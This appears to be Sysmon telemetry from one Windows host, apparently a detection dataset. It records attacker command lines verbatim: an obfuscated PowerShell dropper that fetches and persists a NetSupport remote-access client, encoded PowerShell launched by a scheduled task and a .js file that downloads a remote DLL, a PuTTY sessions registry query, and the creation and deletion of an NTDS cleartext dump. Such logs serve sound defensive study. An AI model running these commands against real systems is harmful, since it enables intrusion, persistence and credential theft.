{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"wins-d19","CreationUtcTime":"2023-06-16 10:01:00.000","EventID":11,"Hostname":"wins-d19","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Level":4,"Message":"","OpcodeValue":0,"ProcessGuid":"{C784477D-B0D6-648B-B80A-000000004A00}","ProcessID":2240,"ProcessId":"6632","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":749893,"RuleName":"EXE","SourceName":"Microsoft-Windows-Sysmon","TargetFilename":"C:\\Users\\lisawalker\\AppData\\Roaming\\OfficeStartup\\client32.exe","ThreadID":2996,"UserID":"S-1-5-18","UtcTime":"2023-06-16 10:01:00.000","Version":2}
{"Channel":"Microsoft-Windows-Sysmon/Operational","CommandLine":"\"C:\\Users\\lisawalker\\AppData\\Roaming\\OfficeStartup\\client32.exe\" ","Company":"NetSupport Ltd","Computer":"wins-d19","CurrentDirectory":"C:\\Users\\lisawalker\\AppData\\Roaming\\OfficeStartup\\","Description":"NetSupport Client Application","EventID":1,"FileVersion":"V12.70","Hashes":"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E","Hostname":"wins-d19","Image":"C:\\Users\\lisawalker\\AppData\\Roaming\\OfficeStartup\\client32.exe","IntegrityLevel":"High","Level":4,"LogonGuid":"{C784477D-081A-6482-DB4F-040000000000}","LogonId":"0x44fdb","Message":"","OpcodeValue":0,"OriginalFileName":"client32.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -Command \"cd $env:AppData; $Z1P0r='R0k3r.zip'; $eXp4r0cH=Get-Command expand-archive -ErrorAction SilentlyContinue; $p4NteCh=$env:APPDATA+'\\'+$Z1P0r; $lI0n3k='https://a.ezydict.com/4th_2.zip'; $r1N4m='OfficeStartup'; $b1tS1iT=Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue; $b1tSiRcDm = 'bitsadmin.exe /transfer MeDoW /download /priority normal '+$lI0n3k+' '+$p4NteCh; $peS1zP=$env:APPDATA+'\\'+$r1N4m; if ($eXp4r0cH) {if ($b1tS1iT) {Start-BitsTransfer -Source $lI0n3k -Destination $p4NteCh;} else {Invoke-Expression -Command $b1tSiRcDm}; expand-archive -path $p4NteCh -destinationpath $peS1zP; Remove-Item -path $p4NteCh;} else {$f1L1es=@('AudioCapture.dll', 'client32.exe', 'client32.ini', 'HTCTL32.DLL', 'msvcr100.dll', 'nskbfltr.inf', 'NSM.LIC', 'pcicapi.dll', 'PCICHEK.DLL', 'PCICL32.DLL', 'remcmdstub.exe', 'TCCTL32.DLL'); $lI0n3k2='http://YOUR.LINK/files/'; New-Item -Path $env:APPDATA -Name $r1N4m -ItemType 'directory'; if ($b1tS1iT) {$f1L1es | ForEach-Object {$s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\'+$_; Start-BitsTransfer -Source $s10r13s -Destination $1dus1T; }; } else { $f1L1es | ForEach-Object { $s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\'+$_; $b1tSiRcDm2='bitsadmin.exe /transfer MeDoW /download /priority normal '+$s10r13s+' '+$1dus1T; Invoke-Expression -Command $b1tSiRcDm2; }; }; }; $F1l1ed3=Get-Item $peS1zP -Force; $F1l1ed3.attributes='Hidden'; cd $peS1zP; start client32.exe; $F33Sr=$peS1zP+'\\client32.exe'; New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name $r1N4m -Value $F33Sr  -PropertyType 'String'; #g7Vc*-Jh7tZPfY0q6P5D5o15GdlrN#Y7-mQOJpX*i$pocw(-ErQELxY\u0026de$r0xwndS-WV3PLGJ%5zWmLeyAPpYrP*#qgHDM=7UOXjaCfWx=8nWHx_sEFQE%tw1R)g7A\u0026)mBA6nJeZiFOS=Zh#DbY^=WJyZDO2!XWKJGFqFa-$s*agin!r0kd#f!^RPu@mnF5NaBx6$fE$T\u0026d6kyj3\u0026vFok--dte8=1hK!QM-M$8m1C@n%OO%lq$1iaeWW5SX1aBcfkAi\u0026UwPe_xOHnJiEct^1VBmC2EJy3uw_Zi5(eis^88NYX\u00267n\u0026mf%#iy0fVL\u0026T_eRg-S8pE(0qg=MaIDD(Spzk37l7hMRe\u0026Q@0twVYvUbE=hnofn@AA*Y(Sz$oK!J382C00v^yZSnMlyL6CVD!=T-s)*uFi%OxVSNzxSj_=%lOWdZm\u0026HNCi$C+Ar9Ype=-RxmJsdwSEMjJ7@sT@A^vi4+jebdE\u0026W_Uxbgc\u0026j2G1KjeA!=\u0026yH$B_bHLM+Bpn4hY6$pnFWXPCr4JrlKYo(Pra)eeS_L3d=sopqXgG^H+#j*l!zvex+%J#T8cZM\u0026Y((gzD7HiCQJ(-9bRCrh6nV+c7eiQiQ_h6ywU0P3AUtnzlGdq6C$*GS$^(=7\u0026$KnWWpsczhj@VG6(+frmeyyBNnQawJE-q(V3tEo=gkOq2b5hXIu9+AjgmHra@j07QroSPC2YC55!IQi@Y=t-eUJav@Wrd8M%oUXixYa0ftlsa@c6iWW(Q_vCl_)lDr\u0026CzRHa^\u0026qTFyM5CiXjkxQ6Pn6zNT_Cd6Cqv7F^ACC7qKAw7JPm^6K_Zp+wPr(V(l0k@qhe0HTdjB+lJYN*@ICyrrUAmA8DVa\u0026c9xcq_+-T#zfYDP!d6!TOF%\u0026R1eX%oMdi3a3_32Yq*njTDjsVs*PwD)L#e4)bV@dxM\u0026%1BwbsZvdlYka=j+fe9*niSr1C(1(E!K!9!HBGfvAG%US=ipYlC\u0026eA(4)lN3t^I3hMWVWPxMWlJSiCI3n5yTPYp$ni5pQMGH@-#\u0026#^_k(d6UCVqtqpC!4^#TfS@8s\u0026QA^cEZe!jXJR4_6uq3Y-lHr0D_hkxn9LMN$RY#ugP^B2kzoQU(cdqJ5Y+igS1fQ0h=87xG_j$XS)6J3r*((T6+!Fuq+L@@(81_dZyXPn3E9oEiZca9A0x7=@q1qyeN93JFFXP4lJk^8n1iABAm\u0026PdofW\u0026hXHfFC!kxz(PvTTNIuk6G^l6=OqnhXW_1hD_GYo\u0026=RH\u0026TpLTSj^VoPBPfSYFKxoPXNN@R31wLxUsMeyVieYz*rRUBFQTkp3Me8eC516O5^jvvdn3\u0026D$$z17mWM=+1C+FjF\"","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentProcessGuid":"{C784477D-B0D6-648B-B80A-000000004A00}","ParentProcessId":"6632","ProcessGuid":"{C784477D-B0F2-648B-BA0A-000000004A00}","ProcessID":2240,"ProcessId":"2352","Product":"NetSupport Manager","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":749896,"RuleName":"-","SourceName":"Microsoft-Windows-Sysmon","TerminalSessionId":"1","ThreadID":2996,"User":"wins-d19\\lisawalker","UserID":"S-1-5-18","UtcTime":"2023-06-16 10:02:00.000","Version":5}
{"Channel":"Microsoft-Windows-Sysmon/Operational","CommandLine":"\"C:\\Users\\lisawalker\\AppData\\Roaming\\OfficeStartup\\client32.exe\" ","Company":"NetSupport Ltd","Computer":"wins-d19","CurrentDirectory":"C:\\Users\\lisawalker\\AppData\\Roaming\\OfficeStartup\\","Description":"NetSupport Client Application","EventID":1,"FileVersion":"V12.70","Hashes":"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E","Hostname":"wins-d19","Image":"C:\\Users\\lisawalker\\AppData\\Roaming\\OfficeStartup\\client32.exe","IntegrityLevel":"High","Level":4,"LogonGuid":"{C784477D-081A-6482-DB4F-040000000000}","LogonId":"0x44fdb","Message":"","OpcodeValue":0,"OriginalFileName":"client32.exe","ParentCommandLine":"C:\\Windows\\Explorer.EXE","ParentImage":"C:\\Windows\\explorer.exe","ParentProcessGuid":"{C784477D-081A-6482-8000-000000004A00}","ParentProcessId":"4668","ProcessGuid":"{C784477D-B0FA-648B-BC0A-000000004A00}","ProcessID":2240,"ProcessId":"6156","Product":"NetSupport Manager","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":749905,"RuleName":"-","SourceName":"Microsoft-Windows-Sysmon","TerminalSessionId":"1","ThreadID":2996,"User":"wins-d19\\lisawalker","UserID":"S-1-5-18","UtcTime":"2023-06-16 10:03:00.000","Version":5}
{"Channel":"Microsoft-Windows-Sysmon/Operational","CommandLine":"schtasks /CREATE /TN \"gNiJgDEiQ\" /SC once /ST 05:42:34 /F /RU \"lisawalker\" /TR \"powershell -WindowStyle Hidden -EncodedCommand cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIABnAHAAdQBwAGQAYQB0AGUALgBlAHgAZQAgAC8AZgBvAHIAYwBlAA==\"","Company":"Microsoft Corporation","Computer":"wins-d19","CurrentDirectory":"C:\\Users\\lisawalker\\AppData\\Local\\Temp\\zLgOiEwhYsQuHXer\\","Description":"Task Scheduler Configuration Tool","EventID":1,"FileVersion":"10.0.17134.1 (WinBuild.160101.0800)","Hashes":"MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D","Hostname":"wins-d19","Image":"C:\\Windows\\SysWOW64\\schtasks.exe","IntegrityLevel":"High","Level":4,"LogonGuid":"{C784477D-EFF1-6489-16E4-030000000000}","LogonId":"0x3e416","Message":"","OpcodeValue":0,"OriginalFileName":"schtasks.exe","ParentCommandLine":"\"C:\\Users\\lisawalker\\AppData\\Local\\Temp\\zLgOiEwhYsQuHXer\\GVIhOCiNBryBZBVD.exe\" /S","ParentImage":"C:\\Users\\lisawalker\\AppData\\Local\\Temp\\zLgOiEwhYsQuHXer\\GVIhOCiNBryBZBVD.exe","ParentProcessGuid":"{C784477D-F49A-648B-3106-000000004400}","ParentProcessId":"3100","ProcessGuid":"{C784477D-F501-648B-A806-000000004400}","ProcessID":2292,"ProcessId":"4404","Product":"Microsoft\\xae Windows\\xae Operating System","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":1366335,"RuleName":"-","SourceName":"Microsoft-Windows-Sysmon","TerminalSessionId":"1","ThreadID":776,"User":"wins-d19\\lisawalker","UserID":"S-1-5-18","UtcTime":"2023-06-16 10:04:00.000","Version":5}
{"Channel":"Microsoft-Windows-Sysmon/Operational","CommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -encodedcommand \"JABwAHIAbwBiAGEAYgBpAGwAaQB6AGUAIAA9ACAAIgBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAEUAQQBNAFEAQQB4AEEAQwA0AEEATgBBAEEAeABBAEMANABBAE0AUQBBADMAQQBEAE0AQQBMAGcAQQB4AEEARABVAEEATQB3AEEAdgBBAEYAUQBBAFoAQQBCAEMAQQBDADgAQQBRAHcAQgBJAEEAQQA9AD0AZgBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAEUAQQBOAFEAQQAzAEEAQwA0AEEATQBnAEEAeQBBAEQAQQBBAEwAZwBBAHkAQQBEAE0AQQBPAEEAQQB1AEEARABFAEEATgBRAEEAdwBBAEMAOABBAFcAQQBBAHYAQQBEAFUAQQBWAHcAQQA9AGYAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQA1AEEARABVAEEATABnAEEAeABBAEQAUQBBAE4AUQBBAHUAQQBEAEkAQQBOAFEAQQAxAEEAQwA0AEEATQBRAEEAeABBAEQAWQBBAEwAdwBCAEgAQQBHADQAQQBSAGcAQQAzAEEAQwA4AEEAZABRAEIAWgBBAEcATQBBAFoAUQBBAD0AZgBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAFUAQQBNAFEAQQB1AEEARABJAEEATQB3AEEAMgBBAEMANABBAE0AZwBBADQAQQBDADQAQQBNAFEAQQA0AEEARABFAEEATAB3AEIAbwBBAEQASQBBAGEAZwBBAHYAQQBGAGsAQQBNAEEAQgAwAEEASABjAEEATgBBAEIAdwBBAEUAOABBAGEAdwBCAE8AQQBGAGcAQQBVAFEAQQA9AGYAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE0AZwBBAHgAQQBDADQAQQBNAFEAQQAyAEEAQwA0AEEATQBnAEEAeQBBAEQAVQBBAEwAdwBCAEkAQQBGAGcAQQBVAHcAQgBWAEEARABZAEEATgBRAEIAWABBAEMAOABBAFQAdwBCAE4AQQBGAGcAQQBRAGcAQgAxAEEARABjAEEAUgBnAEIAUwBBAEUAZwBBAE0AUQBCAEIAQQBFADQAQQBmAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAVQBBAE0AUQBBAHUAQQBEAEkAQQBNAHcAQQAyAEEAQwA0AEEATQBRAEEAMABBAEMANABBAE0AUQBBAHoAQQBEAGsAQQBMAHcAQgB0AEEASABrAEEAWgB3AEIAcQBBAEcAWQBBAGEAQQBBAHYAQQBEAFkAQQBkAGcAQgB3AEEARQBnAEEAUQBnAEIAMgBBAEcAVQBBAFMAZwBCAFUAQQBFADAAQQAiADsAZgBvAHIAZQBhAGMAaAAgACgAJABBAG4AdABpAG8AZABvAG4AdAAgAGkAbgAgACQAcAByAG8AYgBhAGIAaQBsAGkAegBlACAALQBzAHAAbABpAHQAIAAiAGYAIgApACAAewB0AHIAeQAgAHsAJABSAGUAYQBmAGYAZQBjAHQAaQBvAG4ARgBhAGQAZQBhAHcAYQB5ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAEEAbgB0AGkAbwBkAG8AbgB0ACkAKQA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACQAUgBlAGEAZgBmAGUAYwB0AGkAbwBuAEYAYQBkAGUAYQB3AGEAeQAgAC0ATwAgAEMAOgBcAFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAXABnAGwAYQBuAGQAdQBsAGkAZgBlAHIAbwB1AHMAVQBuAHMAcABlAGMAaQBhAGwAaQB6AGUAZAAuAGQAbABsADsAJABUAHUAcgB0AGwAZQBsAGkAawBlAE4AbwBuAGMAbwBuAGYAbwByAG0AIAA9ACAAIgBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHkAQQBEAEkAQQBNAFEAQQB1AEEARABrAEEATgB3AEEAdQBBAEQAawBBAE4AZwBBAHUAQQBEAEUAQQBOAEEAQQAwAEEAQQA9AD0AIgA7ACQATQB1AGwAdABpAHQAdQBiAGUAcgBjAHUAbABpAHMAbQAgAD0AIAAiAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQASQBBAE0AdwBBADQAQQBDADQAQQBNAFEAQQAxAEEARABBAEEATABnAEEAeABBAEQAYwBBAE8AQQBBAHUAQQBEAGMAQQBNAFEAQQA9AHQAaABiAEQAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBnAEEAMQBBAEMANABBAE8AQQBBAHkAQQBDADQAQQBOAGcAQQB5AEEAQwA0AEEATQBnAEEAegBBAEQAYwBBACIAOwBpAGYAIAAoACgARwBlAHQALQBJAHQAZQBtACAALQBQAGEAdABoACAAQwA6AFwAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABcAGcAbABhAG4AZAB1AGwAaQBmAGUAcgBvAHUAcwBVAG4AcwBwAGUAYwBpAGEAbABpAHoAZQBkAC4AZABsAGwAKQAuAEwAZQBuAGcAdABoACAALQBnAGUAIAA3ADUAOQA3ADQAKQB7AHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAGUAbgBjAG8AZABlAGQAYwBvAG0AbQBhAG4AZAAgACIAWQB3AEIAdABBAEcAUQBBAEkAQQBBAHYAQQBHAE0AQQBJAEEAQgB5AEEASABVAEEAYgBnAEIAawBBAEcAdwBBAGIAQQBBAHoAQQBEAEkAQQBJAEEAQgBEAEEARABvAEEAWABBAEIAUQBBAEgASQBBAGIAdwBCAG4AQQBIAEkAQQBZAFEAQgB0AEEARQBRAEEAWQBRAEIAMABBAEcARQBBAFgAQQBCAG4AQQBHAHcAQQBZAFEAQgB1AEEARwBRAEEAZABRAEIAcwBBAEcAawBBAFoAZwBCAGwAQQBIAEkAQQBiAHcAQgAxAEEASABNAEEAVgBRAEIAdQBBAEgATQBBAGMAQQBCAGwAQQBHAE0AQQBhAFEAQgBoAEEARwB3AEEAYQBRAEIANgBBAEcAVQBBAFoAQQBBAHUAQQBHAFEAQQBiAEEAQgBzAEEAQwB3AEEAYgBRAEIAMQBBAEgATQBBAGQAQQBBADcAQQBBAD0APQAiADsAJAByAHUAcgBhAGwAaQB0AGUAcwAgAD0AIAAiAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeQBBAEQAVQBBAE0AQQBBAHUAQQBEAEkAQQBNAEEAQQAwAEEAQwA0AEEATQBnAEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAE0AQQBNAGcAQQA9AG8AUwBNAHkAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQgBCAEEARwA0AEEAYQBRAEIAdgBBAEcANABBAGEAUQBCAGoAQQBHAEUAQQBiAEEAQgBzAEEASABrAEEAVQB3AEIAeABBAEgAVQBBAFoAUQBCAGgAQQBHAHMAQQBaAFEAQgB5AEEASABrAEEATABnAEIAcABBAEgATQBBAGQAQQBCAGgAQQBHADQAQQBZAGcAQgAxAEEARwB3AEEAIgA7AGIAcgBlAGEAawA7AH0AfQAgAGMAYQB0AGMAaAAgAHsAfQB9AA==\"","Company":"Microsoft Corporation","Computer":"wins-d19","CurrentDirectory":"C:\\Windows\\system32\\","Description":"Windows PowerShell","EventID":1,"FileVersion":"10.0.17134.1 (WinBuild.160101.0800)","Hashes":"MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","Hostname":"wins-d19","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","IntegrityLevel":"Medium","Level":4,"LogonGuid":"{C784477D-EFEF-6489-0CE6-030000000000}","LogonId":"0x3e60c","Message":"","OpcodeValue":0,"OriginalFileName":"PowerShell.EXE","ParentCommandLine":"C:\\Windows\\System32\\WScript.exe \"C:\\Users\\lisawalker\\Desktop\\WnXd6BZpUkcNy.js\"","ParentImage":"C:\\Windows\\System32\\wscript.exe","ParentProcessGuid":"{C784477D-5508-648B-1706-000000004400}","ParentProcessId":"7468","ProcessGuid":"{C784477D-5515-648B-1B06-000000004400}","ProcessID":2272,"ProcessId":"7760","Product":"Microsoft\\xae Windows\\xae Operating System","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":1366185,"RuleName":"-","SourceName":"Microsoft-Windows-Sysmon","TerminalSessionId":"1","ThreadID":792,"User":"wins-d19\\lisawalker","UserID":"S-1-5-18","UtcTime":"2023-06-16 10:05:00.000","Version":5}
<14>Jun 16 10:06:01 wins-d19 Microsoft-Windows-Sysmon[2108]: {"EventTime":1686909961,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":212140,"ProcessID":2108,"ThreadID":4080,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:01.000\r\nProcessGuid: {9d805503-0728-6440-c601-000000000a00}\r\nProcessId: 3000\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c reg query HKEY_USERS\\S-1-5-11-1111111111-1111111111-1111111111-111111\\Software\\SimonTatham\\PuTTY\\Sessions\r\nCurrentDirectory: C:\\Users\\lisawalker\\Desktop\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-fead-643f-0db6-0a0000000000}\r\nLogonId: 0xAB60D\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527\r\nParentProcessGuid: {9d805503-ff17-643f-1501-000000000a00}\r\nParentProcessId: 4464\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:01.000","ProcessGuid":"{9d805503-0728-6440-c601-000000000a00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"\"C:\\Windows\\system32\\cmd.exe\" /c reg query HKEY_USERS\\S-1-5-11-1111111111-1111111111-1111111111-111111\\Software\\SimonTatham\\PuTTY\\Sessions","CurrentDirectory":"C:\\Users\\lisawalker\\Desktop\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-fead-643f-0db6-0a0000000000}","LogonId":"0xab60d","TerminalSessionId":"2","IntegrityLevel":"High","Hashes":"SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527","ParentProcessGuid":"{9d805503-ff17-643f-1501-000000000a00}","ParentProcessId":"4464","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","EventReceivedTime":1686909961,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:02 wins-d19 Microsoft-Windows-Sysmon[2108]: {"EventTime":1686909962,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":212150,"ProcessID":2108,"ThreadID":4080,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:02.000\r\nProcessGuid: {9d805503-0728-6440-c701-000000000a00}\r\nProcessId: 4640\r\nImage: C:\\Windows\\System32\\reg.exe\r\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\r\nDescription: Registry Console Tool\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: reg.exe\r\nCommandLine: reg  query HKEY_USERS\\S-1-5-11-1111111111-1111111111-1111111111-111111\\Software\\SimonTatham\\PuTTY\\Sessions\r\nCurrentDirectory: C:\\Users\\lisawalker\\Desktop\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-fead-643f-0db6-0a0000000000}\r\nLogonId: 0xAB60D\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF\r\nParentProcessGuid: {9d805503-0728-6440-c601-000000000a00}\r\nParentProcessId: 3000\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c reg query HKEY_USERS\\S-1-5-11-1111111111-1111111111-1111111111-111111\\Software\\SimonTatham\\PuTTY\\Sessions","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:02.000","ProcessGuid":"{9d805503-0728-6440-c701-000000000a00}","Image":"C:\\Windows\\System32\\reg.exe","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Description":"Registry Console Tool","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"reg.exe","CommandLine":"reg  query HKEY_USERS\\S-1-5-11-1111111111-1111111111-1111111111-111111\\Software\\SimonTatham\\PuTTY\\Sessions","CurrentDirectory":"C:\\Users\\lisawalker\\Desktop\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-fead-643f-0db6-0a0000000000}","LogonId":"0xab60d","TerminalSessionId":"2","IntegrityLevel":"High","Hashes":"SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF","ParentProcessGuid":"{9d805503-0728-6440-c601-000000000a00}","ParentProcessId":"3000","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" /c reg query HKEY_USERS\\S-1-5-11-1111111111-1111111111-1111111111-111111\\Software\\SimonTatham\\PuTTY\\Sessions","EventReceivedTime":1686909962,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:03 wins-d19 Microsoft-Windows-Sysmon[3080]: {"EventTime":1686909963,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":207994,"ProcessID":3080,"ThreadID":4024,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:03.000\r\nProcessGuid: {9d805503-c34c-643e-c601-000000000a00}\r\nProcessId: 6656\r\nImage: C:\\Windows\\system32\\notepad.exe\r\nTargetFilename: C:\\ProgramData\\o.txt.ntds.cleartext\r\nCreationUtcTime: 2023-06-16 10:06:03.325","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:03.000","ProcessGuid":"{9d805503-c34c-643e-c601-000000000a00}","Image":"C:\\Windows\\system32\\notepad.exe","TargetFilename":"C:\\ProgramData\\o.txt.ntds.cleartext","CreationUtcTime":"2023-06-16 10:06:03.325","EventReceivedTime":1686909963,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:04 wins-d19 Microsoft-Windows-Sysmon[3080]: {"EventTime":1686909964,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":209096,"ProcessID":3080,"ThreadID":4024,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:04.000\r\nProcessGuid: {9d805503-c37d-643e-c901-000000000a00}\r\nProcessId: 4740\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: cmd.exe  /c del C:\\Programdata\\o.txt.ntds.cleartext\r\nCurrentDirectory: C:\\Users\\lisawalker\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-beee-643e-5c62-080000000000}\r\nLogonId: 0x8625C\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527\r\nParentProcessGuid: 